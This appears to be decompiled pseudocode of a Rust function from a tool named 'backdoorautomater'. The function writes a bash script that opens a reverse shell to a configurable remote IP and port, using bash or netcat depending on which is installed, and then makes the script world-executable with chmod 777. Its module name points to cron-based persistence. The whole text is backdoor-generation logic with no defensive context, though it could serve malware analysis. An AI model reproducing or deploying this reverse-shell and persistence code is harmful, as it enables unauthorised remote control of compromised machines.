__int64 __fastcall backdoorautomater::cronshell::write_shell_bash(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v4; // r12
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int128 v9; // xmm0
  __int128 v10; // xmm0
  __int128 v12; // xmm0
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rax
  unsigned int v16; // [rsp+Ch] [rbp-22Ch] BYREF
  __int128 v17; // [rsp+10h] [rbp-228h] BYREF
  __int64 v18; // [rsp+20h] [rbp-218h]
  __int128 v19; // [rsp+30h] [rbp-208h] BYREF
  __int64 v20; // [rsp+40h] [rbp-1F8h]
  __int128 v21; // [rsp+70h] [rbp-1C8h] BYREF
  __int64 v22; // [rsp+80h] [rbp-1B8h]
  __int64 v23; // [rsp+90h] [rbp-1A8h]
  __int64 v24; // [rsp+98h] [rbp-1A0h]
  __int128 v25; // [rsp+B0h] [rbp-188h]
  __int64 v26; // [rsp+C0h] [rbp-178h]
  __int128 v27; // [rsp+D0h] [rbp-168h] BYREF
  __int128 v28; // [rsp+E0h] [rbp-158h]
  _BYTE v29[40]; // [rsp+1A0h] [rbp-98h] BYREF
  __int64 v30; // [rsp+1C8h] [rbp-70h]
  _BYTE v31[40]; // [rsp+1D8h] [rbp-60h] BYREF
  __int64 v32; // [rsp+200h] [rbp-38h]

  std::fs::File::create(&v27, a3);
  if ( !(_DWORD)v27 )
  {
    v16 = DWORD1(v27);
    std::process::Command::new(&v27, aSh_3, 2LL);
    v5 = std::process::Command::arg(&v27, aC_5, 2LL);
    v6 = std::process::Command::arg(v5, aLsBinNc_0, 10LL);
    std::process::Command::output(&v19, v6);
    core::result::Result<T,E>::expect(v29, &v19, &off_22A998);
    core::ptr::drop_in_place<std::process::Command>(&v27);
    std::process::Command::new(&v27, aSh_3, 2LL);
    v7 = std::process::Command::arg(&v27, aC_5, 2LL);
    v8 = std::process::Command::arg(v7, aLsBinUsrNc_0, 14LL);
    std::process::Command::output(&v19, v8);
    core::result::Result<T,E>::expect(v31, &v19, &off_22A9B0);
    core::ptr::drop_in_place<std::process::Command>(&v27);
    if ( v30 && v32 )
    {
      v4 = std::io::Write::write_all(&v16, aBinBash_0, 13LL);
      if ( !v4 )
      {
        v4 = std::io::Write::write_all(&v16, aBinBashCBashID_0, 34LL);
        if ( !v4 )
        {
          v4 = std::io::Write::write_all(&v16, *(_QWORD *)(a2 + 8), *(_QWORD *)(a2 + 16));
          if ( !v4 )
          {
            v4 = std::io::Write::write_all(&v16, asc_1674CE, 1LL);
            if ( !v4 )
            {
              v4 = std::io::Write::write_all(&v16, *(_QWORD *)(a1 + 8), *(_QWORD *)(a1 + 16));
              if ( !v4 )
              {
                v4 = std::io::Write::write_all(&v16, a012DevNull_0, 21LL);
                if ( !v4 )
                  goto LABEL_22;
              }
            }
          }
        }
      }
    }
    else
    {
      v4 = std::io::Write::write_all(&v16, aBinBash_0, 13LL);
      if ( !v4 )
      {
        v9 = *(_OWORD *)(a2 + 8);
        *(_QWORD *)&v27 = aRemoteIp_0;
        *((_QWORD *)&v27 + 1) = 11LL;
        v28 = v9;
        alloc::str::join_generic_copy(&v19, &v27, 2LL, 1LL, 0LL);
        v18 = v20;
        v17 = v19;
        alloc::vec::Vec<T,A>::extend_from_slice(&v17, asc_167431, 2LL);
        v4 = std::io::Write::write_all(&v16, *((_QWORD *)&v17 + 1), v18);
        if ( !v4 )
        {
          v10 = *(_OWORD *)(a1 + 8);
          *(_QWORD *)&v27 = aRemotePort_0;
          *((_QWORD *)&v27 + 1) = 12LL;
          v28 = v10;
          alloc::str::join_generic_copy(&v19, &v27, 2LL, 1LL, 0LL);
          v22 = v20;
          v21 = v19;
          alloc::vec::Vec<T,A>::extend_from_slice(&v21, asc_167433, 2LL);
          v4 = std::io::Write::write_all(&v16, *((_QWORD *)&v21 + 1), v22);
          if ( !v4 )
          {
            v4 = std::io::Write::write_all(&v16, aBinNcRemoteIpR_0, 59LL);
            if ( !v4 )
            {
              core::ptr::drop_in_place<alloc::string::String>(&v21);
              core::ptr::drop_in_place<alloc::string::String>(&v17);
LABEL_22:
              v12 = *(_OWORD *)(a3 + 8);
              *(_QWORD *)&v27 = aChmod777_2;
              *((_QWORD *)&v27 + 1) = 10LL;
              v28 = v12;
              alloc::str::join_generic_copy(&v19, &v27, 2LL, 1LL, 0LL);
              v26 = v20;
              v25 = v19;
              std::process::Command::new(&v27, aSh_3, 2LL);
              v13 = std::process::Command::arg(&v27, aC_5, 2LL);
              v20 = v26;
              v19 = v25;
              v14 = std::process::Command::arg(v13, &v19);
              std::process::Command::output(&v19, v14);
              core::result::Result<T,E>::expect(&v21, &v19, &off_22A9C8);
              core::ptr::drop_in_place<std::process::Command>(&v27);
              alloc::string::String::from_utf8_lossy(&v19, v23, v24);
              v15 = <alloc::borrow::Cow<B> as core::ops::deref::Deref>::deref(&v19);
              <T as alloc::slice::hack::ConvertVec>::to_vec(&v27, v15);
              v18 = v28;
              v17 = v27;
              core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v19);
              backdoorautomater::sanitizer::sanitize_system_command((__int64)&v17);
              core::ptr::drop_in_place<alloc::string::String>(&v17);
              core::ptr::drop_in_place<std::process::Output>(&v21);
              core::ptr::drop_in_place<std::process::Output>(v31);
              core::ptr::drop_in_place<std::process::Output>(v29);
              core::ptr::drop_in_place<std::fs::File>(v16);
              core::ptr::drop_in_place<alloc::string::String>(a3);
              core::ptr::drop_in_place<alloc::string::String>(a2);
              v4 = 0LL;
              goto LABEL_20;
            }
          }
          core::ptr::drop_in_place<alloc::string::String>(&v21);
        }
        core::ptr::drop_in_place<alloc::string::String>(&v17);
      }
    }
    core::ptr::drop_in_place<std::process::Output>(v31);
    core::ptr::drop_in_place<std::process::Output>(v29);
    core::ptr::drop_in_place<std::fs::File>(v16);
    goto LABEL_19;
  }
  v4 = *((_QWORD *)&v27 + 1);
LABEL_19:
  core::ptr::drop_in_place<alloc::string::String>(a3);
  core::ptr::drop_in_place<alloc::string::String>(a2);
LABEL_20:
  core::ptr::drop_in_place<alloc::string::String>(a1);
  return v4;
}